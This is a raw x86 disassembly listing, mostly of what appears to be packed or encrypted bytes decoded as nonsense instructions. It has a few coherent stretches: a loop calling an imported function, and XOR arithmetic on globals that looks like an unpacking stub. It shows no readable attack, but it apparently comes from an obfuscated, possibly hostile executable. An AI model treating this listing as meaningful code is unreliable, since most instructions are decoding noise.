  40629e:	cmp    ecx,0xffffffd3
  4062a1:	stos   BYTE PTR es:[edi],al
  4062a2:	repnz mov esp,0xdac69b3d
  4062a8:	adc    esp,DWORD PTR [esi-0x64]
  4062ab:	std    
  4062ac:	popa   
  4062ad:	call   0xb3a45ba1
  4062b2:	xchg   edx,eax
  4062b3:	mov    WORD PTR [esp+ecx*1],ds
  4062b6:	pop    ecx
  4062b7:	mov    ds:0x353c4488,eax
  4062bc:	add    esp,DWORD PTR [edi]
  4062be:	arpl   WORD PTR [ecx],si
  4062c0:	pop    esp
  4062c1:	sbb    DWORD PTR [ecx],ecx
  4062c3:	jg     0x4062d9
  4062c5:	test   DWORD PTR [ebx+0x75922b78],edi
  4062cb:	add    DWORD PTR [esi+edx*1+0xcca2429],esp
  4062d2:	sti    
  4062d3:	push   esp
  4062d4:	repz les eax,FWORD PTR [ebp+0x45a7014f]
  4062db:	icebp  
  4062dc:	add    BYTE PTR ds:0x276faa88,0xb
  4062e3:	mov    ah,0xd9
  4062e5:	cmp    eax,0x10c3b007
  4062ea:	test   DWORD PTR [esi],ecx
  4062ec:	inc    DWORD PTR [ecx-0x2f]
  4062ef:	jl     0x406338
  4062f1:	fild   QWORD PTR [edi+edx*1]
  4062f4:	sbb    esi,DWORD PTR [esp+edx*8]
  4062f7:	dec    ecx
  4062f8:	sbb    esp,DWORD PTR [ecx+0x7c6bdf86]
  4062fe:	int3   
  4062ff:	push   ecx
  406300:	mov    ebx,0x95e4151f
  406305:	push   ss
  406306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406307:	and    dl,bl
  406309:	xchg   BYTE PTR [edx+edi*1-0xcf8d769],ah
  406310:	or     ebx,DWORD PTR [edx+ebx*8-0x2ba7e09c]
  406317:	mov    al,0x8e
  406319:	cli    
  40631a:	lods   al,BYTE PTR ds:[esi]
  40631b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40631c:	popf   
  40631d:	(bad)  [ecx]
  40631f:	adc    dl,BYTE PTR [esi+eax*4]
  406322:	aaa    
  406323:	das    
  406324:	adc    DWORD PTR [ecx-0x2d2decd5],ecx
  40632a:	jge    0x4062dd
  40632c:	dec    ebp
  40632d:	and    DWORD PTR [esi+0x7e],0x37
  406331:	in     al,dx
  406332:	add    al,0x33
  406334:	sbb    dh,BYTE PTR ds:0x2722cebc
  40633a:	cdq    
  40633b:	inc    ebp
  40633c:	pop    ebp
  40633d:	jmp    0x8192aa76
  406342:	push   ds
  406343:	repz dec esi
  406345:	mov    ds:0x41f282ad,eax
  40634a:	ffreep st(2)
  40634c:	or     DWORD PTR [eax+0x2],edi
  40634f:	mov    bl,0x68
  406351:	dec    ebx
  406352:	sbb    al,0xbf
  406354:	fbstp  TBYTE PTR [ebx+0x5a]
  406357:	inc    edi
  406358:	mov    edi,0xb9cb96d8
  40635d:	mul    DWORD PTR [ebp+0x1b]
  406360:	jl     0x406327
  406362:	(bad)  
  406363:	push   ebx
  406364:	mov    eax,0x2854e213
  406369:	push   ecx
  40636a:	repnz sbb bl,dl
  40636d:	bound  esp,QWORD PTR [ebp+0x48fc7a72]
  406373:	cmp    BYTE PTR [esi],ch
  406375:	and    bh,BYTE PTR [ecx+0x0]
  406378:	retf   
  406379:	mov    al,ds:0xb8d2c737
  40637e:	and    al,0x72
  406380:	xchg   ebx,eax
  406381:	(bad)  
  406382:	or     al,0xa5
  406384:	icebp  
  406385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406386:	and    edx,ecx
  406388:	jp     0x4063cb
  40638a:	test   BYTE PTR [edi],bh
  40638c:	js     0x406382
  40638e:	ds into 
  406390:	cmp    ecx,0x6b
  406393:	adc    ecx,esp
  406395:	inc    esi
  406396:	inc    edi
  406397:	(bad)  
  406398:	dec    DWORD PTR [ecx+0x439c0312]
  40639e:	sub    eax,0x760d4ff4
  4063a3:	or     cl,BYTE PTR [ebx+0x6]
  4063a6:	popa   
  4063a7:	add    ch,cl
  4063a9:	xchg   ecx,eax
  4063aa:	xchg   ebx,eax
  4063ab:	dec    esi
  4063ac:	(bad)  
  4063ad:	adc    BYTE PTR [ebx+eax*1+0x52],ah
  4063b1:	cli    
  4063b2:	leave  
  4063b3:	add    BYTE PTR [edi+0xf3b9ead],cl
  4063b9:	push   ss
  4063ba:	jp     0x977b572e
  4063c0:	bound  esi,QWORD PTR [ebx+0x1c]
  4063c3:	scas   eax,DWORD PTR es:[edi]
  4063c4:	mov    bh,BYTE PTR [esi-0x18]
  4063c7:	dec    ebx
  4063c8:	pusha  
  4063c9:	pop    edi
  4063ca:	dec    esi
  4063cb:	adc    eax,0xd372c5a
  4063d0:	add    BYTE PTR [eax],0x7d
  4063d3:	(bad)  
  4063d4:	jmp    0x6424e939
  4063d9:	repz jge 0x406389
  4063dc:	adc    eax,0x6bcff58a
  4063e1:	or     dh,BYTE PTR [edi]
  4063e3:	arpl   WORD PTR [eax-0x72640aa0],cx
  4063e9:	dec    esp
  4063ea:	mov    cl,0xdc
  4063ec:	jae    0x4063ac
  4063ee:	jle    0x406441
  4063f0:	je     0x406461
  4063f2:	push   ebp
  4063f3:	xchg   DWORD PTR [esi],ebp
  4063f5:	ror    BYTE PTR [edi-0x81c0ba0],1
  4063fb:	aas    
  4063fc:	out    0x87,eax
  4063fe:	cmp    dh,bl
  406400:	dec    edi
  406401:	out    0xb4,al
  406403:	mov    bl,0x8d
  406405:	mov    ebx,0x1f5764f7
  40640a:	ror    DWORD PTR [ebx],1
  40640c:	adc    BYTE PTR [esi-0xe8baf1c],0x73
  406413:	mov    WORD PTR [ebp+0x5],cs
  406416:	rol    BYTE PTR [edx-0x2c7dc588],0x26
  40641d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641e:	jecxz  0x4063b4
  406420:	repnz imul eax,DWORD PTR [ecx+0x6c],0xffffffcb
  406425:	lea    esi,[ebp+0x13192ab3]
  40642b:	gs (bad) 
  40642d:	xchg   esp,eax
  40642e:	cld    
  40642f:	jbe    0x4063ff
  406431:	iret   
  406432:	jo     0x4063b5
  406434:	sub    al,0x82
  406437:	stos   BYTE PTR es:[edi],al
  406438:	pop    es
  406439:	mov    WORD PTR [ebp+0x5f6f8d9],gs
  40643f:	retf   0x4e52
  406442:	inc    esp
  406443:	jmp    0xc9f9:0xb133763d
  40644a:	ins    BYTE PTR es:[edi],dx
  40644b:	idiv   DWORD PTR [ecx-0x390c3f09]
  406451:	dec    edx
  406452:	dec    esi
  406453:	xchg   esp,eax
  406454:	fs xchg ch,dh
  406457:	pop    ds
  406458:	mov    ah,bh
  40645a:	div    DWORD PTR [eiz*2+0x23fca8b5]
  406461:	or     al,BYTE PTR [ecx+0x27c9051d]
  406467:	xchg   ecx,eax
  406468:	imul   DWORD PTR [ebx+0x50]
  40646b:	pop    ss
  40646c:	fisub  DWORD PTR [eax]
  40646e:	popa   
  40646f:	mov    ds:0x62a39518,eax
  406474:	cmp    ecx,DWORD PTR [ecx]
  406476:	mov    cl,0x65
  406478:	mov    esi,0xc4ad8036
  40647d:	pop    es
  40647e:	mov    sp,0xa836
  406482:	mov    ebp,DWORD PTR [ebp+0x5a]
  406485:	xor    eax,0x5b744aa9
  40648a:	jnp    0x406417
  40648c:	loope  0x406453
  40648e:	jecxz  0x406414
  406490:	push   ebx
  406491:	jne    0x40646f
  406493:	sub    ah,BYTE PTR [eax]
  406495:	in     eax,dx
  406496:	push   eax
  406497:	retf   0x71aa
  40649a:	loopne 0x406512
  40649c:	or     eax,0x7c591d6f
  4064a1:	mov    al,0xe0
  4064a3:	scas   al,BYTE PTR es:[edi]
  4064a4:	cdq    
  4064a5:	ret    0xa634
  4064a8:	xchg   ebx,ecx
  4064aa:	cmp    esi,DWORD PTR [eax+0x2bcfdad8]
  4064b0:	inc    ebp
  4064b1:	xchg   edx,eax
  4064b2:	adc    DWORD PTR [eax+0x5e],ebp
  4064b5:	mov    ebp,0x560c5164
  4064ba:	cmp    esp,eax
  4064bc:	jle    0x4064eb
  4064be:	dec    edx
  4064bf:	xchg   ebx,eax
  4064c0:	aam    0xfb
  4064c2:	xor    DWORD PTR [eax],edx
  4064c4:	add    ax,0x4168
  4064c8:	pop    ss
  4064c9:	inc    ebx
  4064ca:	sbb    BYTE PTR [edx],dl
  4064cc:	sbb    ah,dl
  4064ce:	scas   al,BYTE PTR es:[edi]
  4064cf:	std    
  4064d0:	cmp    ch,BYTE PTR [ebx-0x6deb0393]
  4064d6:	lods   eax,DWORD PTR ds:[esi]
  4064d7:	mov    edx,0x3b734b74
  4064dc:	ret    0xc2b6
  4064df:	dec    esp
  4064e0:	inc    edi
  4064e1:	repz and DWORD PTR [edi+0x6b972866],edi
  4064e8:	ja     0x4064a6
  4064ea:	cwde   
  4064eb:	cmc    
  4064ec:	jmp    0x6cc1:0xb02a799d
  4064f3:	cld    
  4064f4:	pop    edx
  4064f5:	or     BYTE PTR [ebx+ebp*2],ah
  4064f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064f9:	loop   0x4064e6
  4064fb:	jmp    FWORD PTR [edx]
  4064fd:	mov    bl,0xf
  4064ff:	scas   al,BYTE PTR es:[edi]
  406500:	jnp    0x40651f
  406502:	int3   
  406503:	sub    eax,0x3ec8ccbd
  406508:	adc    ebp,DWORD PTR [ecx]
  40650a:	ins    DWORD PTR es:[edi],dx
  40650b:	mov    esi,0xceca7c29
  406510:	repz mov esi,0xe969387d
  406516:	fadd   DWORD PTR [ebx+0x70c65955]
  40651c:	ret    0xfb3c
  40651f:	aaa    
  406520:	adc    cl,BYTE PTR [eax]
  406522:	mov    dh,0xc9
  406524:	adc    eax,0x9941b0e1
  406529:	cdq    
  40652a:	inc    eax
  40652b:	cs leave 
  40652d:	cs sub bh,dl
  406530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406531:	test   esi,eax
  406533:	xor    al,0xa0
  406535:	bound  esp,QWORD PTR [ebp+0x2d29e505]
  40653b:	mov    cl,0xb3
  40653d:	js     0x40650e
  40653f:	inc    ecx
  406540:	or     BYTE PTR [ebp+0x38],al
  406543:	je     0x406534
  406545:	mov    dl,0x6c
  406547:	or     eax,0xda2119d4
  40654c:	jne    0x406540
  40654e:	les    eax,FWORD PTR [edi-0x54]
  406551:	and    BYTE PTR [ebx-0x788be4db],bh
  406557:	mov    esp,0x9d76941e
  40655c:	jmp    0x9e7b42f2
  406561:	ss push ebx
  406563:	(bad)  
  406564:	in     eax,0xd
  406566:	push   esi
  406567:	(bad)  
  406568:	call   0x6922c6ca
  40656d:	mov    bl,0xb4
  40656f:	loop   0x40657c
  406571:	inc    esp
  406572:	(bad)
  406576:	lahf   
  406577:	sub    dl,dl
  406579:	pop    esp
  40657a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40657b:	ds and edi,ebp
  40657e:	pop    ss
  40657f:	mov    DWORD PTR [eax],ebp
  406581:	into   
  406582:	inc    edi
  406583:	ds lahf 
  406585:	cmp    BYTE PTR [edi],0x48
  406588:	dec    ebx
  406589:	jno    0x406586
  40658b:	ins    DWORD PTR es:[edi],dx
  40658c:	jno    0x4065e7
  40658e:	nop
  40658f:	cmc    
  406590:	mov    eax,0x67b28948
  406595:	cmp    DWORD PTR [eax+0x7c],ebx
  406598:	dec    edx
  406599:	cmc    
  40659a:	lds    esi,FWORD PTR [edx+0x4b42bafb]
  4065a0:	jnp    0x40653b
  4065a2:	lea    eax,[ebp-0x24]
  4065a5:	movzx  ecx,WORD PTR ds:0x43463b
  4065ac:	and    ecx,DWORD PTR ds:0x434573
  4065b2:	mov    DWORD PTR ds:0x43463b,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x43457f,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43468f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x434577,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x4345cf,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x43456b,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x43456b
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x43456b,ecx
  4065fa:	cmp    DWORD PTR ds:0x43456b,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x4345c7
  40660f:	push   0x43489f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x43456b,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	pop    es
  406639:	xchg   esi,eax
  40663a:	lods   eax,DWORD PTR ds:[esi]
  40663b:	ror    BYTE PTR [ebx+edi*1+0x7e],1
  40663f:	jle    0x406690
  406641:	jns    0x4066c1
  406643:	jle    0x4065f7
  406645:	scas   eax,DWORD PTR es:[edi]
  406646:	mov    ecx,0xe4dc14b9
  40664b:	or     al,0x1b
  40664d:	test   ax,0x6d78
  406651:	and    al,0xa3
  406653:	xlat   BYTE PTR ds:[ebx]
  406654:	sbb    eax,0x30925e65
  406659:	outs   dx,BYTE PTR ds:[esi]
  40665a:	fidiv  DWORD PTR [ebx-0x1fdcdba7]
  406660:	test   eax,0x1849d1ea
  406665:	xlat   BYTE PTR ds:[ebx]
  406666:	dec    ecx
  406667:	fmul   st,st(1)
  406669:	aaa    
  40666a:	jne    0x406619
  40666c:	mov    ah,0x95
  40666e:	std    
  40666f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406670:	cmp    al,0xc7
  406672:	ja     0x4066dc
  406674:	dec    esp
  406675:	push   0xfffffffd
  406677:	out    dx,al
  406678:	je     0x4066a2
  40667a:	iret   
  40667b:	ja     0x406680
  40667d:	mov    ch,0x6a
  40667f:	scas   al,BYTE PTR es:[edi]
  406680:	in     eax,0xa1
  406682:	cli    
  406683:	inc    edx
  406684:	mov    ds:0xb429f8a8,al
  406689:	mov    ds:0xd3937725,al
  40668e:	sub    al,0xbe
  406690:	outs   dx,DWORD PTR fs:[esi]
  406692:	or     ecx,DWORD PTR [edx+0x79]
  406695:	out    dx,eax
  406696:	test   al,0x1
  406698:	sbb    cl,ah
  40669a:	mov    dh,0x3f
  40669c:	loope  0x4066ad
  40669e:	(bad)  
  40669f:	dec    edx
  4066a0:	pop    edi
  4066a1:	inc    ebp
  4066a2:	icebp  
  4066a3:	push   ss
  4066a4:	adc    ah,BYTE PTR [ebx+0x4770f686]
  4066aa:	ins    DWORD PTR es:[edi],dx
  4066ab:	push   esi
  4066ac:	and    BYTE PTR [ecx+0x78c218fa],0x2a
  4066b3:	pop    ds
  4066b4:	or     esp,esp
  4066b6:	leave  
  4066b7:	dec    ebx
  4066b8:	dec    ebx
  4066b9:	jbe    0x406651
  4066bb:	pop    edi
  4066bc:	ins    DWORD PTR es:[edi],dx
  4066bd:	inc    esi
  4066be:	outs   dx,DWORD PTR ds:[esi]
  4066bf:	pushf  
  4066c0:	popf   
  4066c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066c2:	jnp    0x406672
  4066c4:	clc    
  4066c5:	sbb    eax,0xfbde93b1
  4066ca:	scas   eax,DWORD PTR es:[edi]
  4066cb:	ins    DWORD PTR es:[edi],dx
  4066cc:	in     eax,0x35
  4066ce:	fadd   QWORD PTR [eax+ebp*1]
  4066d1:	mov    bl,0x38
  4066d3:	mov    cl,0x1d
  4066d5:	sbb    BYTE PTR [ecx-0x13b2db67],dl
  4066db:	lock imul ebp,DWORD PTR [eax],0x3017beb1
  4066e2:	xor    BYTE PTR [eax],ch
  4066e4:	mov    DWORD PTR [eax+ebx*8],0x7ad6cff6
  4066eb:	(bad)  
  4066ec:	(bad)  
  4066ee:	mov    DWORD PTR gs:[edi],ebx
  4066f1:	iret   
  4066f2:	xchg   esp,eax
  4066f3:	call   0x9bc2:0x34f71ee1
  4066fa:	cmp    esp,DWORD PTR [edx-0x4e]
  4066fd:	fadd   DWORD PTR [ebx-0x7cc88543]
  406703:	daa    
  406704:	jp     0x4066e4
  406706:	sub    ebp,DWORD PTR [eax]
  406708:	bound  ebp,QWORD PTR [eax+0x2fbbfc09]
  40670e:	bound  eax,QWORD PTR [ecx-0x43]
  406711:	aam    0x8b
  406713:	ss (bad) 
  406715:	mov    edx,0x1d8770e5
  40671a:	cwde   
  40671b:	jae    0x406738
  40671d:	push   ecx
  40671e:	mov    ds:0xf1a48599,eax
  406723:	inc    ebp
  406724:	bound  edi,QWORD PTR [edi]
  406726:	(bad)  
  406727:	hlt    
  406728:	xchg   esp,eax
  406729:	jmp    0x294a9288
  40672e:	pop    es
  40672f:	adc    bl,ah
  406731:	push   0x1f
  406733:	icebp  
  406734:	inc    edi
  406735:	(bad)  
  406736:	rcpps  xmm5,XMMWORD PTR [esi+0x34f8e5ce]
  40673d:	ficomp DWORD PTR [ebx+esi*2-0x5]
  406741:	jge    0x406720
  406743:	jae    0x4067b9
  406745:	cs push edi
  406747:	or     al,BYTE PTR [ebx+0x68]
  40674a:	mov    bl,0xb8
  40674c:	test   BYTE PTR [ecx-0xe],bl
  40674f:	fidivr DWORD PTR [ebp+0x565a5daf]
  406755:	jbe    0x4066f3
  406757:	dec    ecx
  406758:	(bad)  
  406759:	jb     0x406760
  40675b:	xor    DWORD PTR ds:0x23ca40a9,eax
  406761:	ja     0x406740
  406763:	xor    DWORD PTR [ecx-0x6c],esi
  406766:	mov    al,ds:0xeeb48908
  40676b:	xlat   BYTE PTR ds:[ebx]
  40676c:	inc    ebx
  40676d:	lods   eax,DWORD PTR ds:[esi]
  40676e:	xor    al,0x4f
  406770:	ss inc ebp
  406772:	add    BYTE PTR [ecx+0x1],ah
  406775:	test   BYTE PTR [edx-0x6e7384fe],bl
  40677b:	ins    BYTE PTR es:[edi],dx
  40677c:	stc    
  40677d:	inc    ecx
  40677e:	jmp    0x18c1:0xc28e320f
  406785:	out    0xfd,eax
  406787:	stos   DWORD PTR es:[edi],eax
  406788:	adc    DWORD PTR [eax+ecx*4],eax
  40678b:	xor    DWORD PTR ds:0x7146eace,ebp
  406791:	retf   0xc204
  406794:	in     eax,dx
  406795:	mov    al,ds:0x9b2dfe
  40679a:	or     al,0x6c
  40679c:	repz aaa 
  40679e:	les    eax,FWORD PTR [eax+0x25]
  4067a1:	and    BYTE PTR [ebx+0x7],0x62
  4067a5:	or     BYTE PTR [esi+eax*8-0x2b],dh
  4067a9:	addr16 lahf 
  4067ab:	out    dx,al
  4067ac:	loopne 0x40681b
  4067ae:	test   eax,0x1d0b5e47
  4067b3:	in     eax,dx
  4067b4:	mov    eax,0x874bac4b
  4067b9:	jb     0x40679c
  4067bb:	dec    edx
  4067bc:	aad    0x1e
  4067be:	ins    BYTE PTR es:[edi],dx
  4067bf:	dec    ebx
  4067c0:	fs add cl,bl
  4067c3:	xchg   BYTE PTR [edx],bh
  4067c5:	cwde   
  4067c6:	jns    0x406752
  4067c8:	xchg   edx,eax
  4067c9:	sti    
  4067ca:	cwde   
  4067cb:	lock jb 0x4067b5
  4067ce:	mov    dl,0x48
  4067d0:	stc    
  4067d1:	cs xor ecx,ebp
  4067d4:	fdivr  DWORD PTR [eax]
  4067d6:	mov    cl,BYTE PTR [ebx]
  4067d8:	mov    bh,0xdf
  4067da:	inc    edx
  4067db:	pushf  
  4067dc:	or     eax,0x53c01cca
  4067e1:	out    0xfa,eax
  4067e3:	add    BYTE PTR [ecx+0x38],dl
  4067e6:	rol    DWORD PTR [eax+0x658e7c31],1
  4067ec:	fsubr  DWORD PTR [ebx]
  4067ee:	and    al,0xd1
  4067f0:	xchg   edi,eax
  4067f1:	cmp    dh,BYTE PTR [ecx+0x5b]
  4067f4:	iret   
  4067f5:	ret    
  4067f6:	test   DWORD PTR [edi+eiz*2],edx
  4067f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067fa:	dec    esp
  4067fb:	mov    al,0x90
  4067fd:	sub    BYTE PTR [esi],ch
  4067ff:	out    dx,eax
  406800:	ins    DWORD PTR es:[edi],dx
  406801:	mov    dh,BYTE PTR [esi-0x47]
  406804:	inc    esp
  406805:	and    ecx,esp
  406807:	inc    esp
  406808:	inc    ecx
  406809:	lds    edx,FWORD PTR [edx+0x2584ee52]
  40680f:	popf   
  406810:	xor    eax,ebp
  406812:	arpl   WORD PTR [eax+edx*8+0x19],bp
  406816:	sub    bl,dl
  406818:	inc    esi
  406819:	ret    0xd0e4
  40681c:	sbb    eax,DWORD PTR [ecx]
  40681e:	in     al,0xa5
  406820:	js     0x40680d
  406822:	out    0xee,eax
  406824:	je     0x4067d8
  406826:	lods   eax,DWORD PTR ds:[esi]
  406827:	out    0x84,al
  406829:	jmp    0x4067ea
  40682b:	push   ss
  40682c:	hlt    
  40682d:	mov    ebx,ebx
  40682f:	(bad)  
  406830:	into   
  406831:	push   ecx
  406832:	jl     0x406837
  406834:	or     ecx,0xd17d37f
  40683a:	mov    edx,0xdb7e1c2d
  40683f:	inc    ecx
  406840:	xchg   al,dl
  406842:	xor    bl,BYTE PTR ds:0x99dc0a51
  406848:	mov    ch,0xab
  40684a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40684b:	or     esi,DWORD PTR [esi]
  40684d:	mov    DWORD PTR [ebx-0x5a],esp
  406850:	cli    
  406851:	lods   eax,DWORD PTR ds:[esi]
  406852:	ins    BYTE PTR es:[edi],dx
  406853:	cwde   
  406854:	out    dx,al
  406855:	pop    es
  406856:	lods   eax,DWORD PTR ds:[esi]
  406857:	scas   eax,DWORD PTR es:[edi]
  406858:	push   0xfffffffc
  40685a:	and    cl,BYTE PTR [esi+0x54bfe3c9]
  406860:	neg    BYTE PTR [ebx-0x1a]
  406863:	xor    BYTE PTR [eax-0xe5ea32c],al
  406869:	sbb    cl,ch
  40686b:	mov    dh,0x5
  40686d:	adc    DWORD PTR [eax+0xaa549ed],eax
  406873:	fcmovnu st,st(6)
  406875:	shl    DWORD PTR [ebx],cl
  406877:	pop    ebx
  406878:	pop    ds
  406879:	mov    edi,0xf2446355
  40687e:	adc    eax,0x53eda58b
  406883:	icebp  
  406884:	shr    DWORD PTR [esi+0x257d3a0],cl
  40688a:	aam    0x1d
  40688c:	dec    esi
  40688d:	scas   eax,DWORD PTR es:[edi]
  40688e:	bswap  esp
  406890:	mov    bl,0x81
  406892:	imul   BYTE PTR [edx]
  406894:	ret    
  406895:	mov    esi,0x67606a5
  40689a:	fwait
  40689b:	cmp    esp,eax
  40689d:	sub    al,BYTE PTR [ebp+0x27]
  4068a0:	arpl   WORD PTR [ebp+0x8],ax
  4068a3:	dec    ecx
  4068a4:	in     al,0xde
  4068a6:	test   eax,0xab8b4fac
  4068ab:	inc    ecx
  4068ac:	push   esi
  4068ad:	jnp    0x40684e
  4068af:	xchg   edx,eax
  4068b0:	retf   0xa083
  4068b3:	dec    ecx
  4068b4:	fld    QWORD PTR [ecx+0x502f3f35]
  4068ba:	int    0x36
  4068bc:	jmp    DWORD PTR [edi+eax*4+0x36]
  4068c0:	xchg   ebp,eax
  4068c1:	arpl   cx,bp
  4068c3:	adc    al,0x26
  4068c5:	push   ds
  4068c6:	int    0x13
  4068c8:	xchg   BYTE PTR [ebp-0x31],dl
  4068cb:	stos   DWORD PTR es:[edi],eax
  4068cc:	jbe    0x4068cf
  4068ce:	jb     0x40690d
  4068d0:	out    0x4a,eax
  4068d2:	push   cs
  4068d3:	dec    edx
  4068d4:	call   0x99f68ea8
  4068d9:	jle    0x406934
  4068db:	lods   eax,DWORD PTR ds:[esi]
  4068dc:	and    al,0xe7
  4068de:	pop    ds
  4068df:	pop    ebx
  4068e0:	jne    0x406890
  4068e2:	jge    0x40693b
  4068e4:	or     DWORD PTR [edi],edx
  4068e6:	cld    
  4068e7:	aam    0xfd
  4068e9:	test   BYTE PTR [edx],bh
  4068eb:	repnz pop eax
  4068ed:	ficomp WORD PTR [edx+0x2867147]
  4068f3:	stos   BYTE PTR es:[edi],al
  4068f4:	clc    
  4068f5:	mov    ds:0xbff7142a,eax
  4068fa:	sbb    BYTE PTR [ebx-0x1504c50c],ch
  406900:	(bad)  
  406901:	aam    0x36
  406903:	fdivr  DWORD PTR [edi-0x18]
  406906:	loop   0x406983
  406908:	or     DWORD PTR [esi],0xffffffab
  40690b:	sbb    dl,BYTE PTR [edi+0x40ae3bf7]
  406911:	xchg   ecx,eax
  406912:	repnz xor cl,dh
  406915:	enter  0x1ffe,0x72
  406919:	xchg   ebx,eax
  40691a:	fcom   DWORD PTR [esp+0xa]
  40691e:	jb     0x406922
  406920:	push   eax
  406921:	push   0xb982b504
  406926:	das    
  406927:	or     al,0xc9
  406929:	xor    esp,DWORD PTR ds:0x67875c63
  40692f:	icebp  
  406930:	gs pop edx
  406932:	inc    edi
  406933:	cmp    DWORD PTR [ecx],ebp
  406935:	cmp    al,0xd0
  406937:	add    al,0x38
  406939:	or     BYTE PTR [ebx-0x2e],dh
  40693c:	or     ebx,0x6b
  40693f:	mov    ah,BYTE PTR [ebx]
  406941:	push   edx
  406942:	aad    0x4a
  406944:	and    eax,0x2205e9a
  406949:	int3   
  40694a:	popf   
  40694b:	sub    ebp,esi
  40694d:	jg     0x4068fb
  40694f:	bound  eax,QWORD PTR [ebp+0x57]
  406952:	repnz icebp 
  406954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406955:	xchg   edi,eax
  406956:	vmread DWORD PTR ds:0x6d38d4de,esp
  40695d:	jo     0x40698c
  40695f:	stc    
  406960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406961:	arpl   WORD PTR [edx-0x5fc666ba],ax
  406967:	push   esi
  406968:	retf   0x6bb
  40696b:	out    0x25,al
  40696d:	sub    ah,bl
  40696f:	adc    bl,BYTE PTR [eax]
  406971:	xor    ebp,ecx
  406973:	mov    edi,DWORD PTR [ebp+0x1dbeacff]
  406979:	mov    gs,WORD PTR [ebp+0x5f]
  40697c:	mov    ch,BYTE PTR gs:[edx-0x7b9b765d]
  406983:	cdq    
  406984:	lock or eax,DWORD PTR [edx+eax*1+0x41ca523a]
  40698c:	scas   al,BYTE PTR es:[edi]
  40698d:	mov    al,0xb6
  40698f:	pop    esi
  406990:	(bad)  
  406991:	push   ebp
  406992:	dec    edx
  406993:	int3   
  406994:	es cmc 
  406996:	mov    al,0x75
  406998:	out    0x7,eax
  40699a:	lock in al,dx
  40699c:	or     esp,DWORD PTR [eax-0x3c0cbd0a]
  4069a2:	inc    ebp
  4069a3:	adc    BYTE PTR [eax+ebx*1+0x42],dh
  4069a7:	loopne 0x4069ba
  4069a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069aa:	es cmp eax,0x24e8a2fb
  4069b0:	data16 mov al,0xd2
  4069b3:	lods   al,BYTE PTR ds:[esi]
  4069b4:	sub    DWORD PTR [ebp+0x2b9dc3dc],esp
  4069ba:	inc    edx
  4069bb:	mov    bl,0xd0
  4069bd:	nop
  4069be:	jns    0x406951
  4069c0:	arpl   WORD PTR [ecx+0x2b045a66],ax
  4069c6:	xor    eax,0x99c9937e
  4069cb:	sar    DWORD PTR [ebx+0x61],1
  4069ce:	arpl   WORD PTR ds:0xebed9a31,bp
  4069d4:	pop    esp
  4069d5:	int    0xc0
  4069d7:	mov    esp,0x1698a5fb
  4069dc:	es xchg edi,eax
  4069de:	dec    ebp
  4069df:	xchg   edi,eax
  4069e0:	adc    BYTE PTR [ebx+0x64],bl
  4069e3:	jl     0x40696e
  4069e5:	in     al,dx
  4069e6:	push   ecx
  4069e7:	cmp    cl,BYTE PTR [esi-0x42]
  4069ea:	aad    0xf1
  4069ec:	data16 (bad) 
  4069ee:	mov    eax,es:0x33b5b4b5
  4069f4:	mul    DWORD PTR [ebp+ecx*4+0x4b]
  4069f8:	ins    BYTE PTR es:[edi],dx
  4069f9:	push   edx
  4069fa:	xor    DWORD PTR [edi+eax*4],ebx
  4069fd:	dec    esi
  4069fe:	ins    DWORD PTR es:[edi],dx
  4069ff:	cli    
  406a00:	enter  0x346,0x8b
  406a04:	jl     0x406a4f
  406a06:	mov    ebx,ebp
  406a08:	add    al,0xa1
  406a0a:	repnz push esp
  406a0c:	inc    edi
  406a0d:	pop    esi
  406a0e:	push   ecx
  406a0f:	iret   
  406a10:	pop    edx
  406a11:	daa    
  406a12:	mov    esi,0x5756eba4
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434603,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x43457b
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x4345bb,0x434677
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x43455f,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x4345b7,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
